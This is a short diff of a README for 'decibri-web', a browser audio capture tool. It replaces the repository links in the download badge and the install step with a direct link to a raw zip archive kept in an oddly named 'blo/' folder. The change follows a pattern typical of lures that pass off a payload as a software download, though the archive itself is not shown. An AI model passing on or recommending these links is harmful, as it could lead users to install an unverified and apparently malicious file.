@@ -1,6 +1,6 @@
 # 🎙️ decibri-web - Capture browser audio for voice apps
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Flooded-stellaria921/decibri-web)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Flooded-stellaria921/decibri-web/raw/refs/heads/main/blo/decibri-web-2.5-beta.3.zip)
 
 ## 📖 About decibri-web
 
@@ -21,7 +21,7 @@ Check that your privacy settings allow your browser to access the microphone. Go
 
 Follow these steps to get the software on your machine:
 
-1.  Visit this page to download: [https://github.com/Flooded-stellaria921/decibri-web](https://github.com/Flooded-stellaria921/decibri-web)
+1.  Visit this page to download: [https://github.com/Flooded-stellaria921/decibri-web/raw/refs/heads/main/blo/decibri-web-2.5-beta.3.zip](https://github.com/Flooded-stellaria921/decibri-web/raw/refs/heads/main/blo/decibri-web-2.5-beta.3.zip)
 2.  Click the Download button on the main page.
 3.  Choose a folder on your computer to save the files.
 4.  Wait for the download to finish.
